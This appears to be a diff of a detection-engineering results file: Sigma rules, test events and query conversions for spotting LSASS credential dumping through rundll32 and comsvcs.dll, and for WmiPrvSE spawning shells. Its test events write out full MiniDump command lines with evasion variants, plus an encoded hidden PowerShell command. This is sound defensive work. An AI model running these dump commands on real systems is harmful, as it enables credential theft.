+      "sigma_yaml": "title: Rundll32 Execution Of Comsvcs.dll MiniDump To Dump LSASS\nid: 1c8ac219-a1d5-42d2-af9e-4b87212fc6c4\nstatus: experimental\ndescription: Detects execution of rundll32.exe with the comsvcs.dll MiniDump export to create LSASS memory dumps, a technique\n  used by threat actors for credential access.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-18'\ntags:\n- attack.credential-access\n- attack.t1003.001\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_img:\n    'Image|endswith': '\\\\rundll32.exe'\n  selection_cli:\n    'CommandLine|contains|all':\n    - comsvcs.dll\n    - MiniDump\n  filter_public_temp:\n    'CommandLine|contains|all':\n    - 'C:\\\\Users\\\\Public\\\\'\n    - .dmp\n  filter_windows_temp:\n    'CommandLine|contains|all':\n    - 'C:\\\\Windows\\\\Temp\\\\'\n    - .dmp\n  condition: (selection_img and selection_cli) and (filter_public_temp or filter_windows_temp)\nfalsepositives:\n- Application compatibility testing invoking rundll32 with arbitrary DLLs (does not use MiniDump export or LSASS dump paths)\nlevel: high\n",
       "status": "validated",
       "attack_technique_ids": [
         "T1003.001"
@@ -430,458 +551,158 @@
         {
           "id": "P1",
           "label": "positive",
-          "description": "Rundll32 loading comsvcs.dll from System32",
+          "description": "Rundll32 executing comsvcs.dll MiniDump to dump LSASS to C:\\Users\\Public\\lsass.dmp",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION01",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
             "Image": "C:\\Windows\\System32\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{12345678-1234-1234-1234-1234567890ab}",
-            "ProcessId": "1234",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-10T12:34:56.789Z",
-            "User": "NT AUTHORITY\\SYSTEM",
-            "UtcTime": "2024-06-10T12:34:56.789Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "CommandLine": "C:\\Windows\\system32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Users\\Public\\lsass.dmp full",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         },
         {
           "id": "P2",
           "label": "positive",
-          "description": "Rundll32 loading comsvcs.dll from SysWOW64",
+          "description": "Rundll32 executing comsvcs.dll MiniDump to dump LSASS to C:\\Windows\\Temp\\lsass.dmp",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION02",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
             "Image": "C:\\Windows\\SysWOW64\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\SysWOW64\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{87654321-4321-4321-4321-ba0987654321}",
-            "ProcessId": "5678",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-10T13:45:01.123Z",
-            "User": "DOMAIN\\user",
-            "UtcTime": "2024-06-10T13:45:01.123Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "CommandLine": "C:\\Windows\\SysWOW64\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 584 C:\\Windows\\Temp\\lsass.dmp",
+            "ParentImage": "C:\\Windows\\Explorer.EXE"
           }
         },
         {
           "id": "P3",
           "label": "positive",
-          "description": "Rundll32 loading comsvcs.dll with different casing",
+          "description": "Rundll32 executing comsvcs.dll MiniDump to dump LSASS to C:\\Windows\\Temp\\1.dmp",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION03",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "C:\\WINDOWS\\SYSTEM32\\RUNDLL32.EXE",
-            "ImageLoaded": "C:\\WINDOWS\\SYSTEM32\\COMSVCS.DLL",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{abcdef12-3456-7890-abcd-ef1234567890}",
-            "ProcessId": "9012",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-10T14:56:22.456Z",
-            "User": "LOCAL SERVICE",
-            "UtcTime": "2024-06-10T14:56:22.456Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "\\\"C:\\Windows\\System32\\rundll32.exe\\\" \\\"C:\\Windows\\System32\\comsvcs.dll\\\",MiniDump 996 C:\\Windows\\Temp\\1.dmp",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe"
           }
         },
         {
           "id": "N1",
           "label": "negative",
-          "description": "Legitimate rundll32 loading shell32.dll for Control Panel",
+          "description": "Legitimate rundll32 execution for control panel applet",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "shell32.dll,Control_RunDLL",
-            "Company": "-",
-            "Computer": "WORKSTATION01",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
             "Image": "C:\\Windows\\System32\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\shell32.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{11111111-1111-1111-1111-111111111111}",
-            "ProcessId": "1111",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-10T10:00:00.000Z",
-            "User": "NT AUTHORITY\\SYSTEM",
-            "UtcTime": "2024-06-10T10:00:00.000Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl",
+            "ParentImage": "C:\\Windows\\Explorer.EXE"
           }
         },
         {
           "id": "N2",
           "label": "negative",
-          "description": "Legitimate rundll32 loading netplwiz.dll for User Accounts",
+          "description": "Rundll32 executing a non-MiniDump DLL for application compatibility testing",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "netplwiz.dll,RunDllEntryPoint",
-            "Company": "-",
-            "Computer": "WORKSTATION02",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
             "Image": "C:\\Windows\\System32\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\netplwiz.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{22222222-2222-2222-2222-222222222222}",
-            "ProcessId": "2222",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-10T10:05:00.000Z",
-            "User": "DOMAIN\\user",
-            "UtcTime": "2024-06-10T10:05:00.000Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "CommandLine": "rundll32.exe C:\\Program Files\\SomeApp\\compat.dll,EntryPoint",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         },
         {
           "id": "N3",
           "label": "negative",
-          "description": "Legitimate rundll32 loading devobj.dll for Device Manager",
+          "description": "Rundll32 executing comsvcs.dll without MiniDump export",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "devobj.dll,DeviceObject_RunDLL",
-            "Company": "-",
-            "Computer": "WORKSTATION03",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
             "Image": "C:\\Windows\\System32\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\devobj.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{33333333-3333-3333-3333-333333333333}",
-            "ProcessId": "3333",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-10T10:10:00.000Z",
-            "User": "LOCAL SERVICE",
-            "UtcTime": "2024-06-10T10:10:00.000Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll,DllRegisterServer",
+            "ParentImage": "C:\\Windows\\System32\\wbem\\wmiprvse.exe"
           }
         },
         {
           "id": "R1",
           "label": "positive",
-          "description": "Rundll32 loading comsvcs.dll from WinSxS component store (patched binary)",
+          "description": "PowerShell parent, extra whitespace in command line, different output filename in C:\\Users\\Public\\",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION04",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "10.0.19041.1",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-rundll32_31bf3856ad364e35_10.0.19041.1_none_abcdef123456\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\WinSxS\\amd64_microsoft-windows-comsvcs_31bf3856ad364e35_10.0.19041.1_none_78901234abcd\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "rundll32.exe",
-            "PipeName": "-",
-            "ProcessGuid": "{11223344-5566-7788-9900-aabbccddeeff}",
-            "ProcessId": "3456",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-11T08:12:34.567Z",
-            "User": "NT AUTHORITY\\SYSTEM",
-            "UtcTime": "2024-06-11T08:12:34.567Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe   C:\\Windows\\System32\\comsvcs.dll , MiniDump  1124  C:\\Users\\Public\\cred.dmp  full",
+            "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
           }
         },
         {
           "id": "R2",
           "label": "positive",
-          "description": "Rundll32 loading comsvcs.dll using 8.3 short names",
+          "description": "SysWOW64 rundll32, no quoting, different PID, output to C:\\Windows\\Temp\\",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION05",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "C:\\WINDOWS\\SYSTEM32\\RUNDLL~1.EXE",
-            "ImageLoaded": "C:\\WINDOWS\\SYSTEM32\\COMSVC~1.DLL",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{22334455-6677-8899-0011-bbccddeeff00}",
-            "ProcessId": "4567",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-11T09:23:45.678Z",
-            "User": "DOMAIN\\admin",
-            "UtcTime": "2024-06-11T09:23:45.678Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "Image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\SysWOW64\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump 3088 C:\\Windows\\Temp\\lsass_01.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         },
         {
           "id": "R3",
           "label": "positive",
-          "description": "Rundll32 copied to user temp directory (same filename) loading comsvcs.dll from System32",
+          "description": "Single quotes around executable and DLL path, extra spaces, output to C:\\Users\\Public\\",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION06",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rundll32.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "rundll32.exe",
-            "PipeName": "-",
-            "ProcessGuid": "{33445566-7788-9900-1122-ccddeeff0011}",
-            "ProcessId": "5678",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-11T10:34:56.789Z",
-            "User": "CORP\\jdoe",
-            "UtcTime": "2024-06-11T10:34:56.789Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "'C:\\Windows\\System32\\rundll32.exe' 'C:\\Windows\\System32\\comsvcs.dll',MiniDump 2204 'C:\\Users\\Public\\dump.dmp'",
+            "ParentImage": "C:\\Windows\\System32\\wscript.exe"
           }
         },
         {
           "id": "R4",
           "label": "positive",
-          "description": "Rundll32 loading comsvcs.dll with all-lowercase paths",
+          "description": "Copied rundll32.exe in non-standard location (same name), double quotes around DLL path only",
           "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION07",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "c:\\windows\\system32\\rundll32.exe",
-            "ImageLoaded": "c:\\windows\\system32\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "-",
-            "PipeName": "-",
-            "ProcessGuid": "{44556677-8899-0011-2233-ddeeff001122}",
-            "ProcessId": "6789",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-11T11:45:07.890Z",
-            "User": "LOCAL SERVICE",
-            "UtcTime": "2024-06-11T11:45:07.890Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
+            "Image": "C:\\Temp\\rundll32.exe",
+            "CommandLine": "C:\\Temp\\rundll32.exe \"C:\\Windows\\System32\\comsvcs.dll\", MiniDump 4096 C:\\Windows\\Temp\\memory.dmp full",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R5",
+          "label": "positive",
+          "description": "Mixed casing in non-critical parts, tab-like spacing, output to C:\\Windows\\Temp\\ with different PID",
+          "event": {
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe\tC:\\Windows\\System32\\comsvcs.dll,\tMiniDump\t5172\tC:\\Windows\\Temp\\lsass_dump.dmp",
+            "ParentImage": "C:\\Windows\\System32\\svchost.exe"
+          }
+        },
+        {
+          "id": "R6",
+          "label": "negative",
+          "description": "Benign compatibility test: rundll32 with comsvcs.dll but different export (not MiniDump), output to Public\\",
+          "event": {
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, SomeOtherExport 1234 C:\\Users\\Public\\test.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R7",
+          "label": "negative",
+          "description": "Rundll32 with different DLL and MiniDump export (invalid combo), output to Windows\\Temp\\",
+          "event": {
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\other.dll, MiniDump 5678 C:\\Windows\\Temp\\test.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R8",
+          "label": "negative",
+          "description": "Rundll32 with correct DLL and export but output to non-monitored directory (C:\\Temp\\)",
+          "event": {
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 9999 C:\\Temp\\lsass.dmp",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+          }
+        },
+        {
+          "id": "R9",
+          "label": "negative",
+          "description": "Admin running rundll32 for documentation with dummy arguments, no MiniDump, no .dmp in target dirs",
+          "event": {
+            "Image": "C:\\Windows\\System32\\rundll32.exe",
+            "CommandLine": "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, DummyExport 0 C:\\Users\\Admin\\docs\\output.txt",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe"
           }
         }
       ],
       "validation": {
         "candidate_id": "D1",
         "parse_ok": true,
-        "sql": "SELECT * FROM logs WHERE (Image LIKE '%\\\\rundll32.exe' ESCAPE '\\' OR Image LIKE '%\\\\rundll~1.exe' ESCAPE '\\') AND (ImageLoaded LIKE '%\\\\comsvcs.dll' ESCAPE '\\' OR ImageLoaded LIKE '%\\\\comsvc~1.dll' ESCAPE '\\')",
+        "sql": "SELECT * FROM logs WHERE (Image LIKE '%\\\\rundll32.exe' ESCAPE '\\' AND (CommandLine LIKE '%comsvcs.dll%' ESCAPE '\\' AND CommandLine LIKE '%MiniDump%' ESCAPE '\\')) AND ((CommandLine LIKE '%C:\\\\Users\\\\Public\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.dmp%' ESCAPE '\\') OR (CommandLine LIKE '%C:\\\\Windows\\\\Temp\\\\%' ESCAPE '\\' AND CommandLine LIKE '%.dmp%' ESCAPE '\\'))",
         "issues": [],
         "test_outcomes": [
           {
@@ -943,377 +764,6 @@
             "label": "positive",
             "matched": true,
             "passed": true
-          }
-        ],
-        "positives_total": 7,
-        "positives_matched": 7,
-        "negatives_total": 3,
-        "negatives_matched": 0,
-        "benign_total": 110,
-        "benign_hits": 0,
-        "benign_examples": [],
-        "passed": true
-      },
-      "conversions": {
-        "splunk": "Image=\"*\\\\rundll32.exe\" OR Image=\"*\\\\rundll~1.exe\" ImageLoaded=\"*\\\\comsvcs.dll\" OR ImageLoaded=\"*\\\\comsvc~1.dll\"",
-        "elasticsearch": "(Image:(*\\\\rundll32.exe) OR Image:(*\\\\rundll\\~1.exe)) AND (ImageLoaded:(*\\\\comsvcs.dll) OR ImageLoaded:(*\\\\comsvc\\~1.dll))",
-        "kusto": "DeviceImageLoadEvents\n| where (InitiatingProcessFolderPath endswith \"\\\\rundll32.exe\" or InitiatingProcessFolderPath endswith \"\\\\rundll~1.exe\") and (FolderPath endswith \"\\\\comsvcs.dll\" or FolderPath endswith \"\\\\comsvc~1.dll\")",
-        "sqlite": "SELECT * FROM logs WHERE (Image LIKE '%\\\\rundll32.exe' ESCAPE '\\' OR Image LIKE '%\\\\rundll~1.exe' ESCAPE '\\') AND (ImageLoaded LIKE '%\\\\comsvcs.dll' ESCAPE '\\' OR ImageLoaded LIKE '%\\\\comsvc~1.dll' ESCAPE '\\')"
-      },
-      "conversion_errors": {},
-      "history": [
-        {
-          "iteration": 0,
-          "phase": "initial",
-          "summary": "positives 3/3, negatives blocked 3/3, benign hits 0/110",
-          "passed": true,
-          "change_summary": ""
-        },
-        {
-          "iteration": 0,
-          "phase": "redteam",
-          "summary": "4 evasion variants -> positives 6/7, negatives blocked 3/3, benign hits 0/110",
-          "passed": false,
-          "change_summary": ""
-        },
-        {
-          "iteration": 1,
-          "phase": "refine",
-          "summary": "positives 7/7, negatives blocked 3/3, benign hits 0/110",
-          "passed": true,
-          "change_summary": "Updated Image and ImageLoaded selections to use windash modifier and added 8.3 short name variants to catch both long and short filename forms of rundll32.exe and comsvcs.dll."
-        }
-      ],
-      "author_notes": "",
-      "redteam_analysis": "The rule keys on Image and ImageLoaded with endswith matching for '\\rundll32.exe' and '\\comsvcs.dll'. Positive variants P4-P7 demonstrate path variations (WinSxS, 8.3 short names, copied binary with same filename, lowercase paths) that a well-written endswith rule will catch because the filename suffix remains identical. Out_of_scope O1 shows a renamed binary where Image no longer ends with rundll32.exe; the rule cannot see this without also checking OriginalFileName (which is present but not used). O2 shows a completely different loader binary, which is a different technique (T1003.001 but not the specific LOLBin pair). Negative variants N1-N3 (below) represent legitimate rundll32 usage loading shell32.dll or other DLLs for Control_RunDLL, and SCCM installer activity; they share the Image but differ on ImageLoaded, so the rule correctly excludes them.",
-      "redteam_out_of_scope": [
-        {
-          "id": "X1",
-          "label": "positive",
-          "description": "Renamed rundll32.exe (evil.exe) loading comsvcs.dll - rule keys on Image endswith, OriginalFileName not used",
-          "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION08",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\evil.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "rundll32.exe",
-            "PipeName": "-",
-            "ProcessGuid": "{55667788-9900-1122-3344-eeff00112233}",
-            "ProcessId": "7890",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-11T12:56:18.901Z",
-            "User": "CORP\\jdoe",
-            "UtcTime": "2024-06-11T12:56:18.901Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
-          }
-        },
-        {
-          "id": "X2",
-          "label": "positive",
-          "description": "Custom loader (not rundll32) loading comsvcs.dll for minidump - different binary entirely",
-          "event": {
-            "Channel": "Microsoft-Windows-Sysmon/Operational",
-            "CommandLine": "-",
-            "Company": "-",
-            "Computer": "WORKSTATION09",
-            "DestinationIp": "-",
-            "DestinationPort": "-",
-            "Details": "-",
-            "EventID": 7,
-            "FileVersion": "-",
-            "Hashes": "-",
-            "Hostname": "-",
-            "Image": "C:\\Temp\\custom_loader.exe",
-            "ImageLoaded": "C:\\Windows\\System32\\comsvcs.dll",
-            "Imphash": "-",
-            "Keywords": "-",
-            "Level": "-",
-            "LogonGuid": "-",
-            "LogonId": "-",
-            "Message": "-",
-            "OriginalFileName": "custom_loader.exe",
-            "PipeName": "-",
-            "ProcessGuid": "{66778899-0011-2233-4455-ff0011223344}",
-            "ProcessId": "8901",
-            "Product": "-",
-            "Provider_Name": "Microsoft-Windows-Sysmon",
-            "QueryName": "-",
-            "RuleName": "-",
-            "Signature": "-",
-            "SignatureStatus": "-",
-            "Signed": "-",
-            "TargetFilename": "-",
-            "TargetObject": "-",
-            "TimeCreated": "2024-06-11T13:07:29.012Z",
-            "User": "NT AUTHORITY\\SYSTEM",
-            "UtcTime": "2024-06-11T13:07:29.012Z",
-            "md5": "-",
-            "sha1": "-",
-            "sha256": "-"
-          }
-        }
-      ]
-    },
-    {
-      "candidate_id": "D4",
-      "title": "WmiPrvSE Spawns Cmd Or Powershell As Child Process",
-      "sigma_yaml": "title: WmiPrvSE Spawns Cmd Or Powershell As Child Process\nid: 6728f269-d5ca-4dbe-aa29-ebd3af1c2b97\nstatus: experimental\ndescription: Detects WmiPrvSE.exe spawning cmd.exe or powershell.exe, indicative of WMI-based lateral movement activity such\n  as seen in the Saltmarsh intrusion set.\nauthor: RuleSmith (Nemotron via Nebius Token Factory)\ndate: '2026-10-17'\ntags:\n- attack.lateral-movement\n- attack.t1028\nlogsource:\n  category: process_creation\n  product: windows\n  service: sysmon\ndetection:\n  selection_wmi_parent:\n    'ParentImage|endswith': '\\WmiPrvSE.exe'\n  selection_cmd_child:\n    'Image|endswith': '\\cmd.exe'\n  selection_powershell_child:\n    'Image|endswith': '\\powershell.exe'\n  condition: selection_wmi_parent and (selection_cmd_child or selection_powershell_child)\nfalsepositives:\n- Legitimate administrative or monitoring tools using WMI to spawn scripts via cscript.exe or other known children.\n- Authorized software deployment or patch management utilizing WMI providers.\nlevel: high\n",
-      "status": "validated",
-      "attack_technique_ids": [
-        "T1028"
-      ],
-      "tests": [
-        {
-          "id": "P1",
-          "label": "positive",
-          "description": "WmiPrvSE.exe spawning cmd.exe as observed in Saltmarsh post-exploitation lateral movement.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\cmd.exe",
-            "CommandLine": "cmd.exe /c whoami",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "P2",
-          "label": "positive",
-          "description": "WmiPrvSE.exe spawning powershell.exe during lateral movement with encoded command.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-            "CommandLine": "powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand SQBuAHYAbwByAGUALAAgACIAOwAkAHMAdABiAHMAaQBuAGkAdABlACAAPQAiAHMAZABmAGIAIgB9ADsAKQAoAA==",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "P3",
-          "label": "positive",
-          "description": "WmiPrvSE.exe spawning cmd.exe from SysWOW64 on x64 system during WMI lateral movement.",
-          "event": {
-            "ParentImage": "C:\\Windows\\System32\\WmiPrvSE.exe",
-            "Image": "C:\\Windows\\SysWOW64\\cmd.exe",
-            "CommandLine": "cmd /c ipconfig /all",
-            "User": "NT AUTHORITY\\SYSTEM"
-          }
-        },
-        {
-          "id": "N1",
-          "label": "negative",
-          "description": "WmiPrvSE.exe spawning cscript.exe, a common legitimate child for WMI scripting.",
-          "event": {
